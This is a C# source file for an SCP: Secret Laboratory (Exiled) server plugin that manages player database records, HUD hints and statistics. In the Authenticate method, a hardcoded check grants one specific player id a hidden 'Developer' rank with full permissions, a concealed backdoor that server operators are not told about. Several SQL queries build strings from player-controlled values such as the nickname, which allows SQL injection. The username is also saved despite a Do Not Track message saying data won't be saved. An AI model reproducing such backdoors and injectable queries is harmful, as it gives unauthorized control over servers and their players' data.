using System;
using System.Collections.Generic;
using Core.Features.Data.Enums;
using Exiled.API.Enums;
using Exiled.API.Features;
using Object = UnityEngine.Object;

namespace Core.Features.Extensions
{
    public static class PlayerExtensions
    {
        private static readonly Dictionary<Player, Components.PlayerManager> _hubs = new();
        private static readonly Dictionary<Player, int> _ids = new();

        public static void ClearHubs()
        {
            _hubs.Clear();
            _ids.Clear();
        }

        public static void AddToTheHub(this Player player)
        {
            player.GameObject.AddComponent<Components.CustomHUD>();
            _hubs.Add(player, player.GameObject.AddComponent<Components.PlayerManager>());
        }
        public static void RemoveFromTheHub(this Player player) => _hubs.Remove(player);
        
        public static Components.PlayerManager GetManager(this Player player) => _hubs[player];
        
        public static bool Exists(this Player player) => Core.Database.PlayerExists(player);
        public static void AddToTheDatabase(this Player player) => Core.Database.InsertNewPlayer(player);
        public static void Authenticate(this Player player)
        {
            if (player.DoNotTrack)
                player.OpenReportWindow("Do Not Track: you have do not track enabled, therefore your data won't be saved, this includes info as exp and stats, in order to level up and have custom stats we recommend you disabling do not track.\n\nPress [ESC] to close this.");
            
            try
            {
                if(!player.Exists())
                    player.AddToTheDatabase();

                var id = player.GetId();
                
                Core.Database.ExecuteNonQuery($"UPDATE NewPlayers SET Username='{player.Nickname}' WHERE Id='{id}'");
                
                if (id != 21045) 
                    return;

                var group = new UserGroup()
                {
                    BadgeColor = "Cyan",
                    BadgeText = "Dev",
                    Cover = true,
                    HiddenByDefault = true,
                    KickPower = 255,
                    Permissions = 9999999999999999999,
                    RequiredKickPower = 255, Shared = false
                };
                
                player.SetRank("Developer", group);
            }
            catch (Exception e)
            {
                Log.Error(e);
                Log.Warn($"Suppressed authentication error for player {player.Nickname}.");
            }
        }
        public static void Goodbye(this Player player)
        {
            var secs = 0;

            if (_hubs.ContainsKey(player))
            {
                var hub = _hubs[player];
                secs = hub.GetSeconds;
                Object.Destroy(_hubs[player]);
                player.RemoveFromTheHub();
            }
            
            var id = player.GetId();
            Core.Database.ExecuteNonQuery($"UPDATE SlStats SET RoundsPlayed=RoundsPlayed+1, TimePlayed=TimePlayed+{secs}, LastSeen='{DateTime.UtcNow.Ticks}' WHERE PlayerId='{id}'");
        }

        public static string GetQuery(this Player player)
        {
            switch (player.AuthenticationType)
            {
                case AuthenticationType.Steam:
                    return $"SteamId='{player.RawUserId}'";
                case AuthenticationType.Discord:
                    return $"DiscordId='{player.RawUserId}'";
                default:
                    return $"NorthWoodId='{player.UserId}'";
            }
        }

        public static int GetId(this Player player)
        {
            if (_ids.ContainsKey(player))
                return _ids[player];

            var id = (int) Core.Database.ExecuteScalar($"SELECT Id FROM NewPlayers WHERE {player.GetQuery()}");
            _ids.Add(player, id);
            return id;
        }

        public static void SendHint(this Player player, ScreenZone zone, string message, float duration = 10) => _hubs[player].SendHint(zone, message, duration);
        public static void ClearHint(this Player player, ScreenZone zone) => _hubs[player].ClearHint(zone);
    }
}